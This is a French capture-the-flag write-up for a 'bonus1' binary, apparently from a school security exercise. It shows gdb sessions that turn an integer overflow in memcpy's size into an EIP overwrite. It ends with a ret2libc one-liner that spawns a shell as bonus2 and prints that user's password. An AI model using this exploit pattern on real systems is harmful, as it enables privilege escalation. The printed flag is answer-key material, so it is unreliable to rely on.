@@ -1,0 +1,146 @@
+Je trouve un fichier bonus1 composer d'une seul fonction main qui prend deux argument.
+
+on voie que la fonction atoi le premier argument envoyez dans le fichier et effectue une vérification pour voir si la taille est plus petit que 10
+Il y a une seconde vérification sur le même nombr equi lui vérifie que le nombre n'est plus egale a 1464814662
+
+On peu essayez un ret2libc étant donné qu'il y a une chaien de charactère '/bin/sh' dans le programme.
+Je vais exploiter le memcpy avec un bufferOverflow, qui prend le nombre que j'ai entrer comme argument pour limiter la taille du buffer
+et qui copy mon secon argument dans une variable d'une taille max de 40 bits.
+Pour cela je vais exploiter l'overflow du int entrer quand celui-ci est multiplier par 4 (memcpy(auStack60, envp[2], iStack20 * 4))
+
+Je vais commencer par voir ce qui ce passe avec mon nombre que j'entre en premier argument et avec un string dans le second pour vérifier ce que je voie.
+
+	(gdb) r 9 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+	Starting program: /home/user/bonus1/bonus1 9 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+
+	Breakpoint 1, 0x08048473 in main ()
+	(gdb) i r
+	eax            0xbffff654	-1073744300
+	ecx            0x24	36
+	edx            0xbffff877	-1073743753
+	ebx            0xb7fd0ff4	-1208152076
+	esp            0xbffff640	0xbffff640
+	ebp            0xbffff688	0xbffff688
+	esi            0x0	0
+	edi            0x0	0
+	eip            0x8048473	0x8048473 <main+79>
+	eflags         0x200282	[ SF IF ID ]
+	cs             0x73	115
+	ss             0x7b	123
+	ds             0x7b	123
+	es             0x7b	123
+	fs             0x0	0
+	gs             0x33	51
+	(gdb)
+
+On voie que ecx contient bien mon premier argument * 4 (9*4 = 36).
+Je vais donc injecter size_t / 4 pour provoquer un overflow et voir ce qui ce passe (4294967295 / 4 est 1073741823) Comme memcpy prend en 3 argument un size_t.
+
+
+	(gdb) r -1073741823 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+	The program being debugged has been started already.
+	Start it from the beginning? (y or n) y
+	Starting program: /home/user/bonus1/bonus1 -1073741823 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+
+	Breakpoint 1, 0x08048473 in main ()
+	(gdb) i r
+	eax            0xbffff654	-1073744300
+	ecx            0x4	4
+	edx            0xbffff877	-1073743753
+	ebx            0xb7fd0ff4	-1208152076
+	esp            0xbffff640	0xbffff640
+	ebp            0xbffff688	0xbffff688
+	esi            0x0	0
+	edi            0x0	0
+	eip            0x8048473	0x8048473 <main+79>
+	eflags         0x200282	[ SF IF ID ]
+	cs             0x73	115
+	ss             0x7b	123
+	ds             0x7b	123
+	es             0x7b	123
+	fs             0x0	0
+	gs             0x33	51
+
+Le resultat est 4 ce n'est pas suffisant pour déborder le tampon de la variable dest de memecpy
+je vais donc retirer 10 au nombre size_t / 4 - 10 (1073741813)
+
+		(gdb) r -1073741813 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+		The program being debugged has been started already.
+		Start it from the beginning? (y or n) y
+		Starting program: /home/user/bonus1/bonus1 -1073741813 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+
+		Breakpoint 1, 0x08048473 in main ()
+		(gdb) i r
+		eax            0xbffff654	-1073744300
+		ecx            0x2c	44
+		edx            0xbffff877	-1073743753
+		ebx            0xb7fd0ff4	-1208152076
+		esp            0xbffff640	0xbffff640
+		ebp            0xbffff688	0xbffff688
+		esi            0x0	0
+		edi            0x0	0
+		eip            0x8048473	0x8048473 <main+79>
+		eflags         0x200282	[ SF IF ID ]
+		cs             0x73	115
+		ss             0x7b	123
+		ds             0x7b	123
+		es             0x7b	123
+		fs             0x0	0
+		gs             0x33	51
+
+Je suis a 44 ce qui n'est toujours pas suffisant pour génrer un segment-fault donc je retire encore 10 de mon nombre.
+
+	(gdb) r -1073741803 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+	Starting program: /home/user/bonus1/bonus1 -1073741803 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+
+	Program received signal SIGSEGV, Segmentation fault.
+	0x4f4f4f4e in ?? ()
+
+Cette fois j'ai enfin réussi a récrire la variable EIP avec 4f qui ce trouve être O donc mon offset est de 14 * 4 = 56
+
+je dois maintenant récupérer l'addresse de la string '/bin/sh'
+Pour cela de disass le main et j'affiche de contenu de la variable deplacer dans esp.
+
+	(gdb) disass main
+	Dump of assembler code for function main:
+	0x08048492 <+110>:	movl   $0x8048583,(%esp)
+	0x08048499 <+117>:	call   0x8048350 <execl@plt>
+	0x0804849e <+122>:	mov    $0x0,%eax
+	0x080484a3 <+127>:	leave
+	0x080484a4 <+128>:	ret
+	End of assembler dump.
+	(gdb) x/s 0x8048583
+	0x8048583:	 "/bin/sh"
+	(gdb)
+
+
+je dois maintenant récuperer l'addresse de la fonction system pour cela je place un breakpoint sur la fonction main et je run le programme.
+
+	(gdb) b main
+	Breakpoint 1 at 0x8048427
+	(gdb) r
+	Starting program: /home/user/bonus1/bonus1
+
+	Breakpoint 1, 0x08048427 in main ()
+	(gdb) info function system
+	All functions matching regular expression "system":
+
+	Non-debugging symbols:
+	0xb7e6b060  __libc_system
+	0xb7e6b060  system
+	0xb7f49550  svcerr_systemerr
+	(gdb)
+
+Il ne me reste qu'a construire l'exploit que je vais utiliser pour ouvrire un nouveau shell.
+
+	(\x90 * 56) + addresse system + OSEF + addresse de la string /bin/sh
+
+	./bonus1 -1073741803 $(python -c 'print "\x90"*56+"\x60\xb0\xe6\xb7"+"NOPE"+"\x83\x85\x04\x08"')
+
+me voila sur un nouveau shell avec les droits de l'utilisateur bonus2.
+
+	$ whoami
+	bonus2
+	$ cd /home/user/bonus2
+	$ cat .pass
+	579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
